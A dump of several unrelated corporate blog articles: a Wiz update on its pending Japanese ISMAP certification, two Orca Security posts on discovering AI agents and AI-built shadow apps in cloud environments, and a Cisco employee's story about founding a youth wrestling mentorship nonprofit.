Post-registration adherence to scheduled renewal applications and ongoing audits and verifications

Under the hood, ISMAP complements established global standards. The ISMAP Control Measures are built around the Common Standards for Government Agencies as well as JIS Q 27001 and JIS Q 27017, the Japanese national standards for ISO/IEC 27001 and ISO/IEC 27017, covering information security management and cloud security controls. While ISMAP aligns with these frameworks, holding these certifications does not directly equate to ISMAP registration. Additionally, ISMAP also pulls in ISO/IEC 27018 for cloud privacy, alongside NIST SP 800-53 controls to plug edge cases that the core ISO standards do not explicitly cover.

Currently, proposed revisions to the ISMAP Control Measures have been published, focusing on reflecting revised international standards and streamlining the number of control measures. These proposals aim to reorganize and rationalize the control system, which is expected to enhance efficiency upon revision and enforcement while maintaining the security and reliability demanded by the program. Please note that the draft revisions and implementation schedule remain subject to change.

Where Wiz Stands Today

Wiz has maintained active ISO 27001, ISO 27017, ISO 27018, SOC 2, PCI DSS, and FedRAMP certifications and reports for the past five years. Our commitment to compliance gives our teams established practices for control implementation, evidence collection, and continuous audit readiness. We recently finished an internal gap assessment against both the current ISMAP Control Measures and the published revision proposals to prepare for the upcoming ISMAP audit.

To address the specific requirements of the ISMAP framework, we are actively building out the localized evidence packages and formal processes required for ISMAP assessors. In parallel, we have engaged with an audit firm registered on the ISMAP Auditors List, with target plans to formally launch the external assessment audit in early 2027.

What This Means for Customers

To be clear: ISMAP does not offer an official "in progress" or provisional status. You're either on the official registry or you are not–and right now, we are not.

What we can confirm is that we are executing our ISMAP-specific requirements by leveraging our extensive experience with certifications such as ISO 27001, SOC 2 Type II, PCI-DSS, FedRAMP, IRAP, and CPSTIC. We have completed the gap analysis, engaged with registered assessors, and are addressing control artifacts ahead of time rather than scrambling during the audit window.

In the meantime, security teams in Japan already use Wiz to audit and enforce the core security areas: IAM, data encryption, centralized logging, continuous vulnerability scanning, and incident response. However, compliance with ISMAP security standards is not verified or guaranteed solely by the use of Wiz.

Looking Ahead

Our roadmap is straightforward: finalize the contract with an assessment body and formally commence the external ISMAP assessment audit in early 2027. We will share further updates as we hit key audit milestones over the next year.

If you are navigating Japanese public sector compliance today, we can walk you through our current security posture, share our active ISO and SOC 2 reports, and show you how our existing control mapping aligns with ISMAP. Reach out to your Wiz account team or contact us directly.

articles.title: See Your Cloud and Coding AI Agents in Context
articles.context: When a prompt injection lands on an agent, the attacker inherits all of it
articles.full_text:
Securing AI in the cloud has historically meant securing models. Teams called Amazon Bedrock or Azure OpenAI, maybe hosted an open model on a GPU instance, and security’s job was to find those services, check their configurations, and keep training data from leaking.

AI Agents changed that. An agent takes the model’s output and acts on it. It calls tools, reads and writes data, opens tickets, runs code, and talks to other agents. To do any of that, it needs credentials and permissions. And in most organizations, nobody reviewed what those permissions are.

Orca now discovers the agents running in your cloud, both cloud-managed and self-hosted, including the coding agents your developers run on cloud infrastructure. The platform maps what each agent is connected to, and flags the agents that are misconfigured, over-privileged, or within reach of sensitive data.

Why are agents a different kind of AI risk?

A model’s risk is mostly about what it knows and what it says. An agent’s risk is about what it can do. That depends on four things that usually live in four different places:

The models it calls, managed or self-hosted.

The MCP servers it connects to, each exposing its own set of tools and running with its own credentials.

The identity it runs as, typically the IAM role or service account of the workload it lives on.

The data that identity can reach, from RAG sources and training buckets to production databases.

Agents also tend to blur identity lines. Many run under the same identity as the humans who use them, or inherit whatever role the host machine carries. When a prompt injection lands on an agent, the attacker inherits all of it.

You can’t assess an agent just by looking at the agent. You have to see everything it’s connected to.

Why do existing tools miss it?

Most AI security tools see one layer. One inventories models. Another watches prompts. A third scans code. None of them knows that the LangChain agent on an EC2 instance is authenticated to an MCP server holding a Jira API token, or that its instance role can read an S3 bucket full of customer records.

Consider two agents running in the same account:

Agent A connects to a read-only documentation MCP server. Its workload role can reach one internal bucket of public product docs.

Agent B is a coding agent on a CI runner, configured to bypass permission checks so it runs commands with no human approval. It connects to an MCP server whose environment carries a CI/CD API token, and that server exposes tools like delete_bucket_object and revoke_db_access. The runner’s instance role can read a database containing PII.

An inventory lists both as “AI agent.” Only context tells you that one is a low-risk helper and the other is a path to your crown jewels.

Three Ways Orca Delivers AI Agent Security Posture

#1: Inventory as part of the AIBOM

Orca builds one inventory of every AI agent in your cloud, whether your teams use a managed agent platform or build their own.

Every agent appears in a new Agents tab in the AI Bill of Materials (AIBOM), filterable by account, cloud and framework, with new Agents widgets on the AI Security dashboard. Because SideScanning reads workload data out-of-band, there is nothing to install. No agents are required to find your agents.

AIBOM in the Orca Platform covering models, packages, MCP servers, and AI Agents

#2: Clear relationships in the Unified Data Model

Orca models every agent as a first-class asset in its Unified Data Model and links it to the things that define its risk:

The AI models it uses.

The MCP servers it connects to, whether local or remote, and the tools each server exposes.

The AI packages it was built with.

The IAM role it runs as, and the data stores that role can access.

Because these relationships sit in the same graph as the rest of your cloud, an agent’s blast radius is a question you can answer directly: what can this agent touch, and what could an attacker do with it?

An agent inventory tells you what exists. Agent context tells you what’s at stake.

See an AI agent’s connections to models, IAM roles, data stores, and policies in the Orca Platform.

#3: Prioritized risk in context

Orca adds new alerts built for agent risk: misconfiguration, over-privilege, reachable sensitive data, and runtime detections. Findings include:

AI agents authenticated to MCP servers that hold credentials, such as Jira, Confluence or Jenkins API tokens. A prompt injection against that agent inherits whatever the credential can reach.

AI agents configured to bypass permission checks, which removes the human approval step before the agent reads files, runs commands or calls tools.

MCP configuration files containing live secrets. Orca matches the secret value itself, so a hardcoded token is flagged and a safe environment-variable reference is not.

MCP servers communicating over plaintext HTTP to remote endpoints, exposing tool calls and their data in transit.

MCP tool sets that grant destructive tools such as deleting data, revoking access or terminating clusters.

Each alert includes plain-language remediation steps and is scored with Orca’s dynamic risk scoring, which weighs reachability, exploitability and blast radius rather than a static severity label. Agents can also serve as points in Orca’s attack path analysis, so an over-privileged agent two hops from a production database ranks above a misconfigured agent with nothing nearby.

Use Orca to see what an AI agent can access.

What about the coding agents your developers use?

Coding agents like Claude Code, Codex and Gemini CLI don’t only run on laptops. Teams run them on CI runners, cloud dev environments and build servers, where they pick up the host’s cloud credentials. Orca detects coding agents on cloud workloads the same way it detects any self-hosted agent, including the MCP servers they connect to and settings that turn off their approval prompts.

Coding agents also leave a second footprint: the code they write. Orca attributes code to the AI coding agents and models that wrote it, so you can see what share of your codebase is AI-generated, which repositories carry the most risk in AI-written code, and which models are linked to the most alerts.

Track the risk contributions of Coding Agents to improve their quality.

Visibility is half the job. Through Orca’s AI Skills Hub, you can plug skills and hooks into coding agents so they pull your security requirements, run AppSec scans, and fix issues to policy before code is committed.

One unified platform for cloud and AI risk

Agent findings land in the same alert workflows, integrations and dashboards your team already uses for the rest of your cloud. There is no separate AI console and no separate severity scale. The question every security team now has, “what are our agents doing and what can they reach?”, gets answered with the same context Orca already applies to workloads, identities and data.

Orca shows you every AI agent in your cloud, what it’s connected to, and which ones put sensitive data at risk, so your team can fix the riskiest agents first without slowing down the teams building them.

articles.title: Shadow AI Generated Apps: Find Them in the Cloud and Code You Already Scan
articles.context: The Orca Research Pod recently found that 51% of organizations have adopted AI to build software, yet 81% have critical vulnerabilities in AI packages (Hacker Valley News, 2026)
articles.full_text:
The Orca Research Pod recently found that 51% of organizations have adopted AI to build software, yet 81% have critical vulnerabilities in AI packages (Hacker Valley News, 2026). In 2025, CVE-2025-48757 showed how a single missing database policy in AI-generated Supabase projects exposed data across more than 170 production apps.

None of these apps went through a pull request or a security review. People outside engineering built them, often over a weekend, from accounts the security team had never seen.

When we introduced AI AppGen Security, we made the case that AI app builders turned every employee into a builder, and that the platforms those apps run on need security built for how they work. We started with integrations for Claude Enterprise and Vercel.

The first question we heard from security teams: how do I connect a platform I don’t know we use? Nobody files a ticket for a budget-forecasting app built on Lovable, and the marketing team’s campaign portal never reached architecture review. You can’t connect what you’ve never heard of.

AI app builders leave fingerprints in the DNS, workloads, code, and cloud identities Orca already scans agentlessly. Orca now flags them, so you can find AI-built apps nobody told you about and see what data they can reach. Below, we walk through why your current tools miss these apps, how Orca finds them, and what to do once you know.

Why the usual discovery paths miss AI-generated apps

You’d expect at least one of your existing tools to catch these apps. Here’s why none of them do.

Secure web gateways and CASBs see the visit, not the app. They can tell you an employee opened Lovable or Replit. They can’t tell you what was deployed, what data it holds, or whether it requires a login.

SSPM sees sign-ups through your identity provider. It reads IdP logs and OAuth grants, which shows the SaaS your employees signed up for with a work email. An app built from a personal account never touches your IdP.

AppSec scans the repositories you point it at. If a builder’s bot created the repo in a workspace security has never seen, nobody points anything at it.

Cloud security sees the evidence but doesn’t connect it to the service. A CNAPP already inventories the DNS record, the IAM user, and the package on the VM. Until now, a subdomain resolving into a builder’s IP range was just an address, and an IAM user created by an app builder was just an IAM user. The data was there. Nothing tied it to the service behind it.

Every one of these tools waits for someone to connect a system, a user, or a repo first. The apps that matter most are the ones nobody connected to.

How does Orca find apps nobody reported?

Services that run outside your environment still leave traces inside it. Orca already scans your cloud accounts, workloads, repositories, and external attack surface, so the traces are already in its data.

A fingerprint is an observed trace that ties an asset you own to an external service. Orca stores each one in its unified data model, where you can query it like any other asset. Each one records the service, the type of evidence, the exact value that matched, and when Orca first saw it.

To find these fingerprints, there’s no new agent to deploy, no vendor API to authorize, and nothing for the builder to opt into. Here’s where the evidence comes from:

Your external attack surface. DNS records whose values point into a builder’s or host’s infrastructure, vendor domain-verification records, and response headers showing a site is set up to load inside a builder’s live editor.

Your workloads. SideScanning already inventories installed packages and reads files across VMs and container images. Some builder packages only work inside the builder’s own development environment, so if one shows up on a workload, the project started there. File markers matter as much as packages, because production builds often strip out dependency manifests. Without file markers, package inventory can come back empty on the very images running an AI-built app.

Your code repositories. When an AI builder writes code, it commits under its own bot identity. That identity survives every human edit that follows, so the commit author is the most reliable sign a builder was involved.

Your cloud identities. When an app builder or its host connects to your cloud, it leaves an identity behind: an IAM user or role it authenticates as, a trust policy that lets it in, and a permissions policy naming what it can read. It’s also the only source that tells you what company data the service can reach.

Orca matches what a record points to, not what it’s called. A subdomain named lovable-test that points to a private IP doesn’t get flagged, and an app hosted on Vercel isn’t counted as built with v0. A discovery screen that flags every string with a vendor name in it gets muted within a week.

What can security teams do with the results?

Finding the app is the first step. Next you need to know what it can touch, and get it covered.

Detect: see every AI app service in use, and the evidence behind each one. Findings appear in three places:

AI AppGen Fingerprints have a dedicated Service Fingerprints view grouped by service type and then by service.

On each asset’s page, every fingerprint on that asset is listed with the value that matched.

Dashboard widgets summarize what’s detected, what’s connected, and posture for connected services.

How to find AI-built apps in your cloud environment with Orca. People across a company ship apps with AI app builders such as Lovable, v0, Bolt and similar tools, often without security teams knowing. This demo shows how Orca finds these apps and what they can reach. AI app builders leave evidence in cloud environments, code and DNS. Orca detects these fingerprints from data it already scans, with no agent, vendor API or opt-in required. Fingerprints are grouped by service, and the demo shows fingerprints from Base44, Supabase, Lovable and other AI platforms. For services that Orca integrates with, connect the account to secure the AI platform the same way the cloud is secured: identify issues, prioritize risk and implement remediation. Drill into the asset where a fingerprint was detected to see which other AI app services are tied to it. Set up dashboard widgets to track the footprint of AI-built apps in the cloud environment and manage risk while enabling AI innovation across the business. The demo ends with an invitation to discover shadow AI platforms in the cloud and to contact the Orca team to get started.

Connect: turn a finding into coverage. Where Orca supports a platform you haven’t connected, the fingerprint comes with a Connect action. Detection shows you which connections are worth making. Connecting turns on posture checks inside the platform, like flagging Supabase projects with row-level security turned off.

Why the evidence matters more than the count. Picture two Lovable apps, both found by Orca on the same day:

A marketing landing page. It has a DNS record pointing at the builder and nothing else: no cloud identity and no access to company data.

An internal expense tracker. It has the same DNS record, plus an IAM user Lovable created in your AWS account, with a policy that can read a bucket of customer records.

A tool that counts apps tells you there are 2. What you need to know is that one of them can read customer data.

That’s why the cloud identity fingerprint matters most to a CISO. The policy attached to a builder’s identity has a Resource element that names the buckets, datasets, and query workgroups it can reach.

Finding the AI app builder is only half the answer. The other half is naming the crown jewels the AI-built app can read.

Fingerprints are findings, not alerts. They don’t open alerts or change an asset’s risk score. They give you an inventory to govern from: decide which AI app builders your company allows, then use the Service Fingerprints view to spot the ones you don’t.

One limit to know about: DNS fingerprints cover only the zones Orca can read. The dashboard shows whether your DNS provider is connected, so a zone Orca can’t see never looks clean.

Which services does Orca detect?

Orca fingerprints these services:

AI app builders: Lovable, Vercel, v0, Replit, Base44, Netlify, and Bolt

Data services: Supabase

Where Orca has integrations set up with these services, security teams can connect and secure those AI platforms.

Your builders will keep shipping apps nobody asked security about. Now you’ll know when they do, and what those apps can reach.

Want to see which AI app builders are already running in your environment? Request a demo and we’ll walk you through it.

articles.title: The Ripple Effect: How Mentorship Transforms Lives
articles.context: I was the youngest of four kids, and suddenly my mom — with only a high school diploma, no job, and no child support — was faced with raising four children alone
articles.full_text:
When I was six years old, my father left our family. I was the youngest of four kids, and suddenly my mom — with only a high school diploma, no job, and no child support — was faced with raising four children alone.

A year later, Coach Weir recognized I was a kid who needed direction and introduced me to wrestling. He drove me to tournaments up and down the East Coast, pushed me academically, and encouraged me to make good choices. Wrestling eventually took me to Rutgers University, where I competed at the Division I level and became team captain.

But Coach Weir’s greatest gift wasn't wrestling. He gave me an opportunity and showed me what happens when someone invests in another person.

“Culture is our operating system”

Wrestling taught me that success comes from fundamentals practiced consistently: Preparation, accountability, resilience, integrity, and continuous improvement.

Those lessons followed me to Cisco, where I lead the global team responsible for our Wells Fargo relationship.

The C2X Academy creates a community where mentors build leaders, one student at a time.

We've learned that great doesn’t happen by accident. Culture is our operating system.

Our team follows 33 fundamentals called The Cisco/Wells Fargo Way. Each week, a teammate from somewhere around the globe shares their personal story and what that week's fundamental means to them.

Suddenly, a colleague thousands of miles away becomes more than a name on a Webex screen. We build trust, understand one another, and become more invested in each other’s success.

We share these stories with Wells Fargo colleagues, too. What started as an internal initiative has become part of how we strengthen customer relationships and differentiate ourselves as a partner.

That same philosophy lives at C2X

In 2014, two partners and I opened C2X — Commitment 2 Excellence Wrestling Academy — in a 2,400-square-foot warehouse in Fort Mill, South Carolina.

Like Cisco, we've made culture intentional. Our 24 fundamentals, The C2X Way, include: Listen Generously, Walk in Others' Shoes, Assume Positive Intent, and Practice Blameless Problem-Solving.

Today, C2X is a nonprofit where 10 former collegiate wrestlers coach and mentor more than 200 young people annually. Beyond wrestling, we provide academic support, college recruiting guidance, mentorship, and scholarships for families in need.

The impact goes far beyond the wrestling mat.

Two former wrestlers dreamed of becoming firefighters. We connected them with a C2X family member who leads Charlotte Fire Academy. Today, both serve their communities as firefighters.

Tim (left) with C2X partners Tom Tanis, previous Division I All-American at Rutgers, and Vas Lahanas, a former NCAA qualifier at the University of Maryland.

Another graduated from the University of Virginia after we helped negotiate $250,000 in wrestling scholarship support. He’s now preparing for medical school.

And two young men who attended our first practice in 2014 returned after successful Division I wrestling careers. Today, they’re C2X coaches, investing in the next generation.

The ripple effect

We're now preparing to open a state-of-the-art facility, expanding our reach to approximately 350 young people annually. I'm especially proud that Cisco will support this next chapter with technology to help our athletes train, study, learn, and thrive. CX2 has also been accepted into Benevity, Cisco’s matching gift program.

When I walk into C2X, I think about looking into the stands and always finding my mom. And I remember Coach Weir making room in his car for one more kid.

Neither could have imagined where those sacrifices and acts of kindness would lead. But I see it now.

It’s the culture I strive to create at C2X and the culture we've built with our Cisco/Wells Fargo team: Give someone an opportunity. Believe in them. Help them become more than they thought they could be.

Then, watch the ripple effect continue.

How Laura Tinnelly helped build Cisco’s AI Presentation Coach, proving anyone can innovate.

Monica Naim shares her journey from homelessness to Cisco and how Sleep Out helps youth find hope and stability.
